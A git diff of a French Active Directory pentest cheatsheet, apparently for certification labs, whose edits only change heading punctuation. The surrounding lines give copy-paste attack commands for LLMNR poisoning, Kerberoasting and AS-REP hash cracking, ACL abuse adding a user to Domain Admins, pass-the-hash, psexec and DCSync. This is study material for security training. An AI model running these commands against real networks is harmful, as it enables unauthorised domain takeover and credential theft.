@@ -1,4 +1,4 @@
-# Cheatsheet — Commandes par phase
+# Cheatsheet : Commandes par phase
 
 > Copier-coller directement. Remplacer les variables par tes valeurs.
 
@@ -23,7 +23,7 @@ export ATTACKER_IP="192.168.X.99"
 
 ---
 
-## Phase 0 — Setup
+## Phase 0 : Setup
 
 ```bash
 mkdir -p ~/certif/{scans,hashes,tickets,loot,logs,bloodhound}
@@ -34,7 +34,7 @@ echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf
 
 ---
 
-## Phase 1 — Reconnaissance
+## Phase 1 : Reconnaissance
 
 ```bash
 # Découverte hôtes
@@ -64,7 +64,7 @@ sudo responder -I $IFACE -A
 
 ---
 
-## Phase 2 — Accès Initial
+## Phase 2 : Accès Initial
 
 ```bash
 # Responder actif
@@ -106,7 +106,7 @@ nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN
 
 ---
 
-## Phase 3 — Énumération
+## Phase 3 : Énumération
 
 ```bash
 # BloodHound
@@ -114,7 +114,7 @@ bloodhound-python -u $USER -p $PWD -d $DOMAIN_FQDN \
     -dc $DC_FQDN -ns $DC_IP -c All --zip -o ~/certif/bloodhound/
 sudo neo4j start && bloodhound &
 
-# NetExec — cartographie
+# NetExec : cartographie
 nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN
 nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --shares
 nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --users
@@ -146,7 +146,7 @@ nxc ldap $DC_IP -u $USER -p $PWD --gmsa
 
 ---
 
-## Phase 4 — Escalade
+## Phase 4 : Escalade
 
 ```bash
 # Kerberoasting
@@ -163,11 +163,11 @@ nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
     --asreproast ~/certif/hashes/asrep.hash
 hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
 
-# ACL Abuse — ForceChangePassword
+# ACL Abuse : ForceChangePassword
 bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
     set password $TARGET_USER 'NewPass123!'
 
-# ACL Abuse — AddMember
+# ACL Abuse : AddMember
 bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
     add groupMember 'Domain Admins' $USER
 
@@ -189,7 +189,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
 
 ---
 
-## Phase 5 — Mouvement latéral
+## Phase 5 : Mouvement latéral
 
 ```bash
 # Pass-the-Hash
@@ -212,7 +212,7 @@ psexec.py -k -no-pass $DOMAIN/$USER@$DC_FQDN
 
 ---
 
-## Phase 6 — Compromission
+## Phase 6 : Compromission
 
 ```bash
 # DCSync
